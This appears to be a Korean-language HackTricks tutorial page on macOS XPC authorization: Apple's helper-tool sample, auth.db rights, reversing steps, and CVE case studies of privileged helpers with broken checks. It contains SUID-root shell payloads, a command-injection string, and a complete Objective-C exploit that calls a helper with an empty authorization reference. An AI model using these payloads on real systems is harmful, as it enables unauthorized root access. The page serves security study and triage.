# macOS XPC Authorization

{{#include ../../../../../banners/hacktricks-training.md}}

## XPC Authorization

Apple은 연결 중인 프로세스가 **노출된 XPC 메서드를 호출할 권한이 있는지** 인증하는 또 다른 방법도 제공합니다.<sup>[[2]](#references)</sup>

애플리케이션이 **privileged user로 작업을 실행해야** 하는 경우, 일반적으로 앱 자체를 privileged user로 실행하는 대신 HelperTool을 XPC service로 root 권한으로 설치하여 앱에서 호출해 해당 작업을 수행할 수 있도록 합니다. 그러나 service를 호출하는 앱에는 충분한 authorization이 있어야 합니다.

### ShouldAcceptNewConnection은 항상 YES

[EvenBetterAuthorizationSample](https://github.com/brenwell/EvenBetterAuthorizationSample)에서 예제를 확인할 수 있습니다. `App/AppDelegate.m`에서는 **HelperTool에 ** **connect**하려고 시도합니다. 그리고 `HelperTool/HelperTool.m`의 **`shouldAcceptNewConnection`** 함수는 앞서 설명한 요구 사항을 **확인하지 않습니다**. 항상 YES를 반환합니다:<sup>[[1]](#references)</sup>
```objectivec
- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection
// Called by our XPC listener when a new connection comes in.  We configure the connection
// with our protocol and ourselves as the main object.
{
assert(listener == self.listener);
#pragma unused(listener)
assert(newConnection != nil);

newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
newConnection.exportedObject = self;
[newConnection resume];

return YES;
}
```
자세한 정보와 이 검사를 올바르게 구성하는 방법은 다음을 참조하세요:


{{#ref}}
macos-xpc-connecting-process-check/
{{#endref}}

### Application 권한

하지만 **HelperTool의 메서드가 호출될 때 authorization이 수행됩니다**.

`App/AppDelegate.m`의 **`applicationDidFinishLaunching`** 함수는 앱이 시작된 후 빈 authorization reference를 생성합니다. 이는 항상 정상적으로 작동해야 합니다.\
그런 다음 `setupAuthorizationRights`를 호출하여 해당 authorization reference에 **일부 rights를 추가**하려고 시도합니다:
```objectivec
- (void)applicationDidFinishLaunching:(NSNotification *)note
{
[...]
err = AuthorizationCreate(NULL, NULL, 0, &self->_authRef);
if (err == errAuthorizationSuccess) {
err = AuthorizationMakeExternalForm(self->_authRef, &extForm);
}
if (err == errAuthorizationSuccess) {
self.authorization = [[NSData alloc] initWithBytes:&extForm length:sizeof(extForm)];
}
assert(err == errAuthorizationSuccess);

// If we successfully connected to Authorization Services, add definitions for our default
// rights (unless they're already in the database).

if (self->_authRef) {
[Common setupAuthorizationRights:self->_authRef];
}

[self.window makeKeyAndOrderFront:self];
}
```
`Common/Common.m`의 `setupAuthorizationRights` 함수는 애플리케이션의 rights를 auth database `/var/db/auth.db`에 저장합니다. 아직 database에 없는 rights만 추가한다는 점에 주목하세요:
```objectivec
+ (void)setupAuthorizationRights:(AuthorizationRef)authRef
// See comment in header.
{
assert(authRef != NULL);
[Common enumerateRightsUsingBlock:^(NSString * authRightName, id authRightDefault, NSString * authRightDesc) {
OSStatus    blockErr;

// First get the right.  If we get back errAuthorizationDenied that means there's
// no current definition, so we add our default one.

blockErr = AuthorizationRightGet([authRightName UTF8String], NULL);
if (blockErr == errAuthorizationDenied) {
blockErr = AuthorizationRightSet(
authRef,                                    // authRef
[authRightName UTF8String],                 // rightName
(__bridge CFTypeRef) authRightDefault,      // rightDefinition
(__bridge CFStringRef) authRightDesc,       // descriptionKey
NULL,                                       // bundle (NULL implies main bundle)
CFSTR("Common")                             // localeTableName
);
assert(blockErr == errAuthorizationSuccess);
} else {
// A right already exists (err == noErr) or any other error occurs, we
// assume that it has been set up in advance by the system administrator or
// this is the second time we've run.  Either way, there's nothing more for
// us to do.
}
}];
}
```
`enumerateRightsUsingBlock` 함수는 `commandInfo`에 정의된 애플리케이션 권한을 가져오는 데 사용됩니다:
```objectivec
static NSString * kCommandKeyAuthRightName    = @"authRightName";
static NSString * kCommandKeyAuthRightDefault = @"authRightDefault";
static NSString * kCommandKeyAuthRightDesc    = @"authRightDescription";

+ (NSDictionary *)commandInfo
{
static dispatch_once_t sOnceToken;
static NSDictionary *  sCommandInfo;

dispatch_once(&sOnceToken, ^{
sCommandInfo = @{
NSStringFromSelector(@selector(readLicenseKeyAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.readLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to read its license key.",
@"prompt shown when user is required to authorize to read the license key"
)
},
NSStringFromSelector(@selector(writeLicenseKey:authorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.writeLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleAuthenticateAsAdmin,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to write its license key.",
@"prompt shown when user is required to authorize to write the license key"
)
},
NSStringFromSelector(@selector(bindToLowNumberPortAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.startWebService",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to start its web service.",
@"prompt shown when user is required to authorize to start the web service"
)
}
};
});
return sCommandInfo;
}

+ (NSString *)authorizationRightForCommand:(SEL)command
// See comment in header.
{
return [self commandInfo][NSStringFromSelector(command)][kCommandKeyAuthRightName];
}

+ (void)enumerateRightsUsingBlock:(void (^)(NSString * authRightName, id authRightDefault, NSString * authRightDesc))block
// Calls the supplied block with information about each known authorization right..
{
[self.commandInfo enumerateKeysAndObjectsUsingBlock:^(id key, id obj, BOOL *stop) {
#pragma unused(key)
#pragma unused(stop)
NSDictionary *  commandDict;
NSString *      authRightName;
id              authRightDefault;
NSString *      authRightDesc;

// If any of the following asserts fire it's likely that you've got a bug
// in sCommandInfo.

commandDict = (NSDictionary *) obj;
assert([commandDict isKindOfClass:[NSDictionary class]]);

authRightName = [commandDict objectForKey:kCommandKeyAuthRightName];
assert([authRightName isKindOfClass:[NSString class]]);

authRightDefault = [commandDict objectForKey:kCommandKeyAuthRightDefault];
assert(authRightDefault != nil);

authRightDesc = [commandDict objectForKey:kCommandKeyAuthRightDesc];
assert([authRightDesc isKindOfClass:[NSString class]]);

block(authRightName, authRightDefault, authRightDesc);
}];
}
```
이는 이 프로세스가 끝날 때 `commandInfo` 내부에 선언된 permissions가 `/var/db/auth.db`에 저장된다는 의미입니다. **authentication이 필요한 각 method**에 대해 database에는 **permission name**과 **`kCommandKeyAuthRightDefault`**가 포함됩니다. 후자는 **누가 이 right를 획득할 수 있는지 나타냅니다**.<sup>[[1]](#references)</sup>

누가 right에 access할 수 있는지 나타내는 다양한 scope가 있습니다. 일부는 [AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity_authorization/lib/AuthorizationDB.h)에 정의되어 있으며([여기에서 모두 확인할 수 있습니다](https://www.dssw.co.uk/reference/authorization-rights/)), 요약하면 다음과 같습니다:<sup>[[9]](#references)[[10]](#references)</sup>

<table><thead><tr><th width="284.3333333333333">Name</th><th width="165">Value</th><th>Description</th></tr></thead><tbody><tr><td>kAuthorizationRuleClassAllow</td><td>allow</td><td>모든 사용자</td></tr><tr><td>kAuthorizationRuleClassDeny</td><td>deny</td><td>아무도 사용할 수 없음</td></tr><tr><td>kAuthorizationRuleIsAdmin</td><td>is-admin</td><td>현재 사용자가 admin이어야 함 (admin group에 속해 있어야 함)</td></tr><tr><td>kAuthorizationRuleAuthenticateAsSessionUser</td><td>authenticate-session-owner</td><td>사용자에게 authentication을 요청</td></tr><tr><td>kAuthorizationRuleAuthenticateAsAdmin</td><td>authenticate-admin</td><td>사용자에게 authentication을 요청. 사용자는 admin이어야 함 (admin group에 속해 있어야 함)</td></tr><tr><td>kAuthorizationRightRule</td><td>rule</td><td>rules 지정</td></tr><tr><td>kAuthorizationComment</td><td>comment</td><td>right에 대한 추가 comments 지정</td></tr></tbody></table>

### Rights Verification

`HelperTool/HelperTool.m`에서 **`readLicenseKeyAuthorization`** function은 **`checkAuthorization`** function을 호출하여 caller가 **해당 method를 execute할 권한이 있는지** 확인합니다. 이 function은 calling process가 보낸 **authData**가 **올바른 format인지** 확인한 다음, 특정 method를 호출하기 위한 **right를 획득하려면 무엇이 필요한지** 확인합니다. 모든 과정이 정상적으로 진행되면 **반환되는 `error`는 `nil`**입니다:
```objectivec
- (NSError *)checkAuthorization:(NSData *)authData command:(SEL)command
{
[...]

// First check that authData looks reasonable.

error = nil;
if ( (authData == nil) || ([authData length] != sizeof(AuthorizationExternalForm)) ) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:paramErr userInfo:nil];
}

// Create an authorization ref from that the external form data contained within.

if (error == nil) {
err = AuthorizationCreateFromExternalForm([authData bytes], &authRef);

// Authorize the right associated with the command.

if (err == errAuthorizationSuccess) {
AuthorizationItem   oneRight = { NULL, 0, NULL, 0 };
AuthorizationRights rights   = { 1, &oneRight };

oneRight.name = [[Common authorizationRightForCommand:command] UTF8String];
assert(oneRight.name != NULL);

err = AuthorizationCopyRights(
authRef,
&rights,
NULL,
kAuthorizationFlagExtendRights | kAuthorizationFlagInteractionAllowed,
NULL
);
}
if (err != errAuthorizationSuccess) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:err userInfo:nil];
}
}

if (authRef != NULL) {
junk = AuthorizationFree(authRef, 0);
assert(junk == errAuthorizationSuccess);
}

return error;
}
```
해당 메서드를 호출할 수 있는 **권한 획득 요구 사항을 확인하기 위해**, `authorizationRightForCommand`는 앞서 언급한 **`commandInfo`** 객체를 확인합니다. 그런 다음 **호출자에게 해당 함수를 호출할 권한이 있는지** 확인하기 위해 **`AuthorizationCopyRights`**를 호출합니다(플래그를 사용하면 사용자와 상호 작용할 수 있음에 유의).<sup>[[1]](#references)[[3]](#references)</sup>

이 경우 `readLicenseKeyAuthorization` 함수를 호출하기 위해 `kCommandKeyAuthRightDefault`는 `@kAuthorizationRuleClassAllow`로 정의되어 있습니다. 따라서 **누구나 호출할 수 있습니다**.

### DB 정보

이 정보는 `/var/db/auth.db`에 저장된다고 언급했습니다. 다음 명령으로 저장된 모든 규칙을 나열할 수 있습니다:
```sql
sudo sqlite3 /var/db/auth.db
SELECT name FROM rules;
SELECT name FROM rules WHERE name LIKE '%safari%';
```
그런 다음 다음을 사용하여 해당 권한에 액세스할 수 있는 사용자를 확인할 수 있습니다:
```bash
security authorizationdb read com.apple.safaridriver.allow
```
### 허용적인 권한

**모든 권한 구성**은 [**여기에서**](https://www.dssw.co.uk/reference/authorization-rights/) 확인할 수 있지만, 사용자 상호작용이 필요하지 않은 조합은 다음과 같습니다:<sup>[[10]](#references)</sup>

1. **'authenticate-user': 'false'**
- 가장 직접적인 key입니다. `false`로 설정하면 이 권한을 얻기 위해 사용자가 authentication을 제공할 필요가 없음을 지정합니다.
- 이는 **아래 2가지 중 하나와 조합하거나, 사용자가 속해야 하는 group을 지정하는 데** 사용됩니다.
2. **'allow-root': 'true'**
- 사용자가 elevated permissions를 가진 root user로 동작하고 이 key가 `true`로 설정된 경우, root user는 추가 authentication 없이 이 권한을 얻을 수 있습니다. 그러나 일반적으로 root user 상태가 되려면 이미 authentication이 필요하므로, 대부분의 사용자에게 이는 "authentication 없음" 시나리오는 아닙니다.
3. **'session-owner': 'true'**
- `true`로 설정하면 session의 소유자(현재 로그인한 사용자)가 자동으로 이 권한을 얻습니다. 사용자가 이미 로그인한 상태라면 추가 authentication을 우회할 수 있습니다.
4. **'shared': 'true'**
- 이 key는 authentication 없이 권한을 부여하지 않습니다. 대신 `true`로 설정하면 해당 권한이 authentication된 후 여러 process 간에 공유될 수 있으며, 각 process가 다시 authentication할 필요가 없습니다. 그러나 `'authenticate-user': 'false'`와 같은 다른 key와 조합하지 않는 한, 권한을 처음 부여할 때는 여전히 authentication이 필요합니다.

다음 [**script를 사용하여**](https://gist.github.com/carlospolop/96ecb9e385a4667b9e40b24e878652f9) 흥미로운 권한을 확인할 수 있습니다:
```bash
Rights with 'authenticate-user': 'false':
is-admin (admin), is-admin-nonshared (admin), is-appstore (_appstore), is-developer (_developer), is-lpadmin (_lpadmin), is-root (run as root), is-session-owner (session owner), is-webdeveloper (_webdeveloper), system-identity-write-self (session owner), system-install-iap-software (run as root), system-install-software-iap (run as root)

Rights with 'allow-root': 'true':
com-apple-aosnotification-findmymac-remove, com-apple-diskmanagement-reservekek, com-apple-openscripting-additions-send, com-apple-reportpanic-fixright, com-apple-servicemanagement-blesshelper, com-apple-xtype-fontmover-install, com-apple-xtype-fontmover-remove, com-apple-dt-instruments-process-analysis, com-apple-dt-instruments-process-kill, com-apple-pcastagentconfigd-wildcard, com-apple-trust-settings-admin, com-apple-wifivelocity, com-apple-wireless-diagnostics, is-root, system-install-iap-software, system-install-software, system-install-software-iap, system-preferences, system-preferences-accounts, system-preferences-datetime, system-preferences-energysaver, system-preferences-network, system-preferences-printing, system-preferences-security, system-preferences-sharing, system-preferences-softwareupdate, system-preferences-startupdisk, system-preferences-timemachine, system-print-operator, system-privilege-admin, system-services-networkextension-filtering, system-services-networkextension-vpn, system-services-systemconfiguration-network, system-sharepoints-wildcard

Rights with 'session-owner': 'true':
authenticate-session-owner, authenticate-session-owner-or-admin, authenticate-session-user, com-apple-safari-allow-apple-events-to-run-javascript, com-apple-safari-allow-javascript-in-smart-search-field, com-apple-safari-allow-unsigned-app-extensions, com-apple-safari-install-ephemeral-extensions, com-apple-safari-show-credit-card-numbers, com-apple-safari-show-passwords, com-apple-icloud-passwordreset, com-apple-icloud-passwordreset, is-session-owner, system-identity-write-self, use-login-window-ui
```
### Authorization 우회 사례 연구

- **CVE-2025-65842 – Acustica Audio Aquarius HelperTool**: 권한이 있는 Mach service `com.acustica.HelperTool`은 모든 연결을 수락하며, 해당 `checkAuthorization:` routine은 `AuthorizationCopyRights(NULL, …)`를 호출하므로 어떤 32바이트 blob도 통과합니다. 이후 `executeCommand:authorization:withReply:`는 공격자가 제어하는 쉼표로 구분된 문자열을 root 권한으로 `NSTask`에 전달하므로, 다음과 같은 payload를 사용할 수 있습니다:
```bash
"/bin/sh,-c,cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"
```
간단하게 SUID root shell을 생성할 수 있습니다. 자세한 내용은 [이 write-up](https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/)을 참고하세요.<sup>[[6]](#references)</sup>
- **CVE-2025-55076 – Plugin Alliance InstallationHelper**: 리스너는 항상 YES를 반환하며, `checkAuthorization:`에는 동일한 NULL `AuthorizationCopyRights` 패턴이 나타납니다. `exchangeAppWithReply:` 메서드는 공격자 입력을 두 번 `system()` 문자열에 연결하므로, `appPath`에 셸 메타문자(예: `"/Applications/Test.app";chmod 4755 /tmp/rootbash;`)를 삽입하면 Mach service `com.plugin-alliance.pa-installationhelper`를 통해 root code execution이 가능합니다. 자세한 내용은 [여기](https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/)를 참고하세요.<sup>[[7]](#references)</sup>
- **CVE-2024-4395 – Jamf Compliance Editor helper**: audit를 실행하면 `/Library/LaunchDaemons/com.jamf.complianceeditor.helper.plist`가 생성되고, Mach service `com.jamf.complianceeditor.helper`가 노출되며, 호출자의 `AuthorizationExternalForm` 또는 code signature를 검증하지 않은 채 `-executeScriptAt:arguments:then:`을 export합니다. 간단한 exploit은 빈 reference를 `AuthorizationCreate`하고, `[[NSXPCConnection alloc] initWithMachServiceName:options:NSXPCConnectionPrivileged]`로 연결한 다음, 해당 메서드를 호출하여 root 권한으로 임의의 바이너리를 실행합니다. 전체 reversing notes와 PoC는 [Mykola Grymalyuk의 write-up](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html)에 있습니다.<sup>[[4]](#references)</sup>
- **CVE-2025-25251 – FortiClient Mac helper**: FortiClient Mac 7.0.0–7.0.14, 7.2.0–7.2.8 및 7.4.0–7.4.2는 authorization gate가 없는 privileged helper에 도달하는 조작된 XPC messages를 허용했습니다. helper는 자체 privileged `AuthorizationRef`를 신뢰했으므로, service에 message를 보낼 수 있는 모든 local user가 helper를 조작하여 root 권한으로 임의의 configuration 변경 또는 command 실행을 유도할 수 있었습니다. 자세한 내용은 [SentinelOne의 advisory summary](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/)를 참고하세요.<sup>[[5]](#references)</sup>

#### 신속한 triage 팁

- 앱이 GUI와 helper를 모두 제공하는 경우, 두 구성 요소의 code requirements를 비교하고 `shouldAcceptNewConnection`이 `-setCodeSigningRequirement:`로 listener를 제한하는지(또는 `SecCodeCopySigningInformation`을 검증하는지) 확인하세요. 검증이 없으면 Jamf 사례와 같은 CWE-863 시나리오로 이어지는 경우가 많습니다. 간단히 확인하면 다음과 같습니다:
```bash
codesign --display --requirements - /Applications/Jamf\ Compliance\ Editor.app
```
- helper가 실제로 권한을 부여한다고 생각하는 대상과 client가 제공하는 대상을 비교합니다. Reverse engineering 시 `AuthorizationCopyRights`에 breakpoint를 설정하고, `AuthorizationRef`가 helper 자체의 권한 컨텍스트가 아니라 `AuthorizationCreateFromExternalForm`에서 유래했는지(client가 제공했는지) 확인합니다. 그렇지 않다면 앞의 사례와 유사한 CWE-863 패턴을 발견했을 가능성이 높습니다.

## Reversing Authorization

### Checking if EvenBetterAuthorization is used

다음 함수를 찾았다면 **`[HelperTool checkAuthorization:command:]`**, 해당 process가 앞서 언급한 authorization 스키마를 사용하고 있을 가능성이 높습니다.

<figure><img src="../../../../../images/image (42).png" alt=""><figcaption></figcaption></figure>

이 함수가 `AuthorizationCreateFromExternalForm`, `authorizationRightForCommand`, `AuthorizationCopyRights`, `AuthorizationFree`와 같은 API를 호출한다면 [**EvenBetterAuthorizationSample**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L101-L154) 패턴을 사용하고 있는 것입니다.

사용자 상호작용 없이 일부 privileged action을 호출할 권한을 얻을 수 있는지 확인하려면 **`/var/db/auth.db`**를 확인합니다.

### Protocol Communication

그런 다음 XPC service와 통신을 설정할 수 있도록 protocol schema를 찾아야 합니다.

**`shouldAcceptNewConnection`** 함수는 export되는 protocol을 나타냅니다.

<figure><img src="../../../../../images/image (44).png" alt=""><figcaption></figcaption></figure>

이 경우 EvenBetterAuthorizationSample과 동일하며, [**check this line**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L94)을 확인할 수 있습니다.

사용된 protocol의 이름을 알면 다음 명령으로 **header definition을 dump**할 수 있습니다.
```bash
class-dump /Library/PrivilegedHelperTools/com.example.HelperTool

[...]
@protocol HelperToolProtocol
- (void)overrideProxySystemWithAuthorization:(NSData *)arg1 setting:(NSDictionary *)arg2 reply:(void (^)(NSError *))arg3;
- (void)revertProxySystemWithAuthorization:(NSData *)arg1 restore:(BOOL)arg2 reply:(void (^)(NSError *))arg3;
- (void)legacySetProxySystemPreferencesWithAuthorization:(NSData *)arg1 enabled:(BOOL)arg2 host:(NSString *)arg3 port:(NSString *)arg4 reply:(void (^)(NSError *, BOOL))arg5;
- (void)getVersionWithReply:(void (^)(NSString *))arg1;
- (void)connectWithEndpointReply:(void (^)(NSXPCListenerEndpoint *))arg1;
@end
[...]
```
마지막으로, 해당 서비스와 통신을 설정하려면 노출된 **Mach Service**의 **이름**만 알면 됩니다. 이를 확인하는 방법은 여러 가지가 있습니다:

- 사용 중인 Mach Service를 확인할 수 있는 **`[HelperTool init]`**에서:

<figure><img src="../../../../../images/image (41).png" alt=""><figcaption></figcaption></figure>

- launchd plist에서:
```xml
cat /Library/LaunchDaemons/com.example.HelperTool.plist

[...]

<key>MachServices</key>
<dict>
<key>com.example.HelperTool</key>
<true/>
</dict>
[...]
```
### Exploit Example

이 예제에서는 다음을 생성합니다:

- 함수가 포함된 protocol 정의
- access를 요청하는 데 사용할 빈 auth
- XPC service에 대한 connection
- connection이 성공한 경우 함수 호출
```objectivec
// gcc -framework Foundation -framework Security expl.m -o expl

#import <Foundation/Foundation.h>
#import <Security/Security.h>

// Define a unique service name for the XPC helper
static NSString* XPCServiceName = @"com.example.XPCHelper";

// Define the protocol for the helper tool
@protocol XPCHelperProtocol
- (void)applyProxyConfigWithAuthorization:(NSData *)authData settings:(NSDictionary *)settings reply:(void (^)(NSError *))callback;
- (void)resetProxyConfigWithAuthorization:(NSData *)authData restoreDefault:(BOOL)shouldRestore reply:(void (^)(NSError *))callback;
- (void)legacyConfigureProxyWithAuthorization:(NSData *)authData enabled:(BOOL)isEnabled host:(NSString *)hostAddress port:(NSString *)portNumber reply:(void (^)(NSError *, BOOL))callback;
- (void)fetchVersionWithReply:(void (^)(NSString *))callback;
- (void)establishConnectionWithReply:(void (^)(NSXPCListenerEndpoint *))callback;
@end

int main(void) {
NSData *authData;
OSStatus status;
AuthorizationExternalForm authForm;
AuthorizationRef authReference = {0};
NSString *proxyAddress = @"127.0.0.1";
NSString *proxyPort = @"4444";
Boolean isProxyEnabled = true;

// Create an empty authorization reference
status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &authReference);
const char* errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);

// Convert the authorization reference to an external form
if (status == errAuthorizationSuccess) {
status = AuthorizationMakeExternalForm(authReference, &authForm);
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Convert the external form to NSData for transmission
if (status == errAuthorizationSuccess) {
authData = [[NSData alloc] initWithBytes:&authForm length:sizeof(authForm)];
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Ensure the authorization was successful
assert(status == errAuthorizationSuccess);

// Establish an XPC connection
NSString *serviceName = XPCServiceName;
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:serviceName options:0x1000];
NSXPCInterface *xpcInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCHelperProtocol)];
[xpcConnection setRemoteObjectInterface:xpcInterface];
[xpcConnection resume];

// Handle errors for the XPC connection
id remoteProxy = [xpcConnection remoteObjectProxyWithErrorHandler:^(NSError *error) {
NSLog(@"[-] Connection error");
NSLog(@"[-] Error: %@", error);
}];

// Log the remote proxy and connection objects
NSLog(@"Remote Proxy: %@", remoteProxy);
NSLog(@"XPC Connection: %@", xpcConnection);

// Use the legacy method to configure the proxy
[remoteProxy legacyConfigureProxyWithAuthorization:authData enabled:isProxyEnabled host:proxyAddress port:proxyPort reply:^(NSError *error, BOOL success) {
NSLog(@"Response: %@", error);
}];

// Allow some time for the operation to complete
[NSThread sleepForTimeInterval:10.0f];

NSLog(@"Finished!");
}
```
## 악용된 기타 XPC privilege helper

- [https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)<sup>[[8]](#references)</sup>

## References

- [1] [Apple Developer — EvenBetterAuthorizationSample](https://developer.apple.com/library/archive/samplecode/EvenBetterAuthorizationSample/Introduction/Intro.html) ([mirror on GitHub](https://github.com/brenwell/EvenBetterAuthorizationSample))
- [2] [Apple Developer — Authorization Services](https://developer.apple.com/documentation/security/authorization-services)
- [3] [Apple Developer — `AuthorizationCopyRights`](https://developer.apple.com/documentation/security/authorizationcopyrights(_:_:_:_:_:))
- [4] [CVE-2024-4395: Jamf Compliance Editor privilege escalation](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html)
- [5] [CVE-2025-25251: FortiClient Mac privilege escalation flaw](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/)
- [6] [CVE-2025-65842 – Acustica Audio HelperTool XPC Service local privilege escalation in Aquarius Desktop on macOS](https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/)
- [7] [CVE-2025-55076 – Plugin Alliance InstallationHelper XPC Service local privilege escalation](https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/)
- [8] [CVE-2019-8805: Apple EndpointSecurity framework privilege escalation (SecureLayer7)](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)
- [9] [Apple Open Source — AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity_authorization/lib/AuthorizationDB.h)
- [10] [Authorization Rights Reference (dssw.co.uk)](https://www.dssw.co.uk/reference/authorization-rights/)
{{#include ../../../../../banners/hacktricks-training.md}}
